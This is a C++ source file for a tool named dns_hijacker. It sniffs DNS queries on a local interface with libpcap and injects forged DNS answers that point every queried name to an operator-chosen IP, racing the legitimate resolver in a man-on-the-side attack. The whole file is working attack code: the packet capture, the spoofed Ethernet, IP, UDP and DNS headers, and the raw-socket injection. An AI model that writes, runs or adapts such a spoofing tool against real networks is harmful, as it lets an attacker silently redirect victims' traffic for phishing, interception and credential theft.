#include <arpa/inet.h>
#include <cstring>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <netinet/ip.h>
#include <iostream>
#include <csignal>
#include <pcap.h>
#include <stdbool.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/ether.h>
#include <thread>

#include "dns_hijacker.h"

static bool keep_running = true;
static struct in_addr redirect_addr; 
static struct ifreq if_idx;

// Function to stop the tool when a keyboard interrupt is received
void signal_handler(int signum)
{
    std::cout << "SIGINT signal receieved. Stopping DNS hijacker..." << std::endl;
    keep_running = false;
    std::terminate();
}

// Help menu to be displayed if the incorrect input is provided
void print_help_menu()
{
    std::cout << "Usage: ./dns_hijacker <interface> <redirect IP>" << std::endl;
    std::cout << "\tinterface: The interface on the computer running DNS Hijacker to sniff on" << std::endl;
    std::cout << "\tredirect IP: The IP address to redirect the traffic to" << std::endl;
}

uint16_t calculate_ip_checksum(struct ip *ip_hdr)
{
    // Ensure the checksum in zeroed out
    ip_hdr->ip_sum = 0;
    uint8_t num_iterations = ip_hdr->ip_hl * 2; // IP header length field * 4 / 2 to get the number of 16-bit values

    // Iterate through the IP header and add each 16-bit value
    uint32_t tmp32 = 0;
    uint16_t *ptr = reinterpret_cast<uint16_t*>(ip_hdr);
    for (int i = 0; i < num_iterations; ++i, ++ptr)
    {
        tmp32 += *ptr;
    }

    // Account for values carried to the higher order bytes
    uint16_t tmp16 = (tmp32 & 0xffff) + (tmp32 >> 16);
    uint16_t ret = ~tmp16;
    return ret;
}

void pcap_callback(u_char *user, const struct pcap_pkthdr* pkthdr, const u_char* packet)
{
    pcap_t* handle = reinterpret_cast<pcap_t*>(user);
    struct sockaddr_ll socket_addr = {};

    // Stop capturing if the SIGINT signal has been received
    if (!keep_running)
    {
	std::cout << "Stopping the Packet capture" << std::endl;
	pcap_breakloop(handle);
	return;
    }

    // Copy capture packet into allocated memory
    u_char* pkt = (u_char*)malloc(pkthdr->caplen);
    if (pkt == NULL)
    {
        std::cout << "Failed to allocate memory to copy capture packet into" << std::endl;
	return;
    }
    memcpy(pkt, packet, pkthdr->caplen);

    // Allocate memory for building the response packet
    int resp_len = pkthdr->caplen + sizeof(DNSRecord);
    u_char* resp_pkt = (u_char*)malloc(resp_len);
    if (resp_pkt == NULL)
    {
        std::cout << "Failed to allocate memory for the response packet" << std::endl;
	free(pkt);
	return;
    }

    // Create pointers to the different portions of the response packet
    struct ether_header *response_ether_hdr = reinterpret_cast<struct ether_header*>(resp_pkt);
    struct ip *resp_ip_hdr = reinterpret_cast<struct ip*>(resp_pkt + sizeof(struct ether_header));
    struct UDPHeader *resp_udp_hdr = reinterpret_cast<struct UDPHeader*>(resp_pkt + sizeof(struct ether_header) + (resp_ip_hdr->ip_hl * 4));
    struct DNSHeader *resp_dns_hdr = reinterpret_cast<struct DNSHeader*>(resp_pkt + sizeof(struct ether_header) + (resp_ip_hdr->ip_hl * 4) + sizeof(struct UDPHeader));
    uint8_t* resp_dns_question_ptr = reinterpret_cast<uint8_t*>(resp_dns_hdr) + sizeof(struct DNSHeader);
    uint8_t* resp_dns_answer_ptr = resp_pkt + pkthdr->caplen;

    // Create pointers to the different portions of the captured packet
    struct ether_header *eth_hdr = reinterpret_cast<struct ether_header*>(pkt);
    struct ip *ip_hdr = reinterpret_cast<struct ip*>(pkt + sizeof(struct ether_header));
    struct UDPHeader *udp_hdr = reinterpret_cast<struct UDPHeader*>(pkt + sizeof(struct ether_header) + (ip_hdr->ip_hl * 4));
    struct DNSHeader *dns_hdr = reinterpret_cast<struct DNSHeader*>(pkt + sizeof(struct ether_header) + (ip_hdr->ip_hl * 4) + sizeof(struct UDPHeader));
    uint8_t* dns_question_ptr = reinterpret_cast<uint8_t*>(dns_hdr) + sizeof(struct DNSHeader);

    if (ip_hdr->ip_hl != 5 || dns_hdr->arcount != 0 || dns_hdr->qdcount > htons(1) || dns_hdr->nscount != 0)
    {
        std::cout << "Unexpected header value found";
	free(pkt);
	free(resp_pkt);
	return;
    }
    
    // Create the response Ethernet header with the source and destination values expected by the target device
    memcpy(response_ether_hdr->ether_dhost, eth_hdr->ether_shost, ETH_ALEN);
    memcpy(response_ether_hdr->ether_shost, eth_hdr->ether_dhost, ETH_ALEN);
    response_ether_hdr->ether_type = eth_hdr->ether_type;

    // Create the response IP header
    memcpy(resp_ip_hdr, ip_hdr, sizeof(struct ip));
    resp_ip_hdr->ip_len = ip_hdr->ip_len + sizeof(DNSRecord);
    resp_ip_hdr->ip_ttl = 64;
    resp_ip_hdr->ip_src = ip_hdr->ip_dst;
    resp_ip_hdr->ip_dst = ip_hdr->ip_src;
    resp_ip_hdr->ip_sum = htons(calculate_ip_checksum(resp_ip_hdr));

    // Create the UDP header
    resp_udp_hdr->src_port = udp_hdr->dest_port;
    resp_udp_hdr->dest_port = udp_hdr->src_port;
    resp_udp_hdr->length = udp_hdr->length + htons(sizeof(DNSRecord));
    //resp_udp_hdr->checksum = calculate_udp_checksum();

    // Create the DNS header
    resp_dns_hdr->id = dns_hdr->id;
    uint16_t flags = 0x8180;
    resp_dns_hdr->flags = htons(flags);
    resp_dns_hdr->qdcount = dns_hdr->qdcount;
    uint16_t num_answers = 1;
    resp_dns_hdr->ancount = htons(num_answers);
    uint16_t auth_rr = 0;
    resp_dns_hdr->nscount = auth_rr;
    resp_dns_hdr->arcount = dns_hdr->arcount;

    // Add the DNS question
    int quest_len = (pkt + pkthdr->caplen) - dns_question_ptr;
    if (quest_len < 0)
    {
        std::cout << "Invalid DNS query length" << std::endl;
	free(pkt);
	free(resp_pkt);
	return;
    }
    memcpy(resp_dns_question_ptr, dns_question_ptr, quest_len);

    // Add DNS answer
    struct DNSRecord *dns_record = reinterpret_cast<struct DNSRecord*>(resp_dns_question_ptr + quest_len);
    uint16_t record_name = 0xc00c;
    dns_record->name = htons(record_name);
    uint16_t record_type = 1;
    dns_record->type = htons(record_type);
    uint16_t dns_class = 1;
    dns_record->dns_class = htons(dns_class);
    uint32_t ttl = 60;
    dns_record->ttl = htonl(ttl);
    uint16_t record_len = 4;
    dns_record->rdlength = htons(record_len);
    dns_record->rdata = redirect_addr.s_addr;

    // Send DNS response
    int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sockfd < 0)
    {
        std::cout << "Failed to create raw socket" << std::endl;
	free(pkt);
	free(resp_pkt);
	return;
    }
    if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0)
    {
        std::cout << "Failed to get interface" << std::endl;
	return;
    }
    socket_addr.sll_ifindex = if_idx.ifr_ifindex;
    socket_addr.sll_halen = ETH_ALEN;
    memcpy(socket_addr.sll_addr, response_ether_hdr->ether_dhost, ETH_ALEN);
    ssize_t bytes_sent = sendto(sockfd, resp_pkt, resp_len, 0, reinterpret_cast<struct sockaddr*>(&socket_addr), sizeof(struct sockaddr_ll));
    if (bytes_sent < 0)
    {
        std::cout << "Failed to send data over socket with error: " << errno << std::endl;
    }
    else
    {
        std::cout << bytes_sent << " bytes have been sent" << std::endl;

    }
    close(sockfd);
    
    free(pkt);
    free(resp_pkt);
}

void sniff_traffic(const char* interface)
{
    char errbuf[PCAP_ERRBUF_SIZE] = {};
    pcap_t* pcap_handle = NULL;
    struct bpf_program fp = {};
    bpf_u_int32 netp, maskp;
    int ret = 0;
    
    pcap_lookupnet(interface, &netp, &maskp, errbuf);

    // Setup packet capture options
    pcap_handle = pcap_open_live(interface, BUFSIZ, 1, -1, errbuf);
    if (pcap_handle == NULL)
    {
        std::cout << "Failed to create handle for PCAP with error " << errbuf << std::endl;
	return;
    }
    
    if (pcap_compile(pcap_handle, &fp, "udp dst port 53", 0, netp) == PCAP_ERROR)
    {
        std::cout << "Failed to compile PCAP filter" << std::endl;
        return;
    }

    if (pcap_setfilter(pcap_handle, &fp) == PCAP_ERROR)
    {
        std::cout << "Failed to set PCAP filter" << std::endl;
	return;
    }

    // Begin packet capture
    if (pcap_loop(pcap_handle, -1, pcap_callback, reinterpret_cast<u_char*>(pcap_handle)) == PCAP_ERROR)
    {
        std:: cout << "Failed to run sniffer" << std::endl;
	return;
    }
}

int main(int argc, char** argv)
{
    if (argc != 3)
    {
        print_help_menu();
	return 0;
    }

    // Register SIGINT signal with signal_handler function to allow keyboard interrupt to be caught and used to stop all threads
    signal(SIGINT, signal_handler);

    strncpy(if_idx.ifr_name, argv[1], IFNAMSIZ - 1);
    inet_aton(argv[2], &redirect_addr);

    // Start threads for sniffing and running the MOTS 
    std::cout << "Starting sniffer to look for DNS traffic..." << std::endl;
    std::thread sniffer_thread(sniff_traffic, argv[1]);

    // Wait for the threads to complete
    sniffer_thread.join();

    return 0;
}
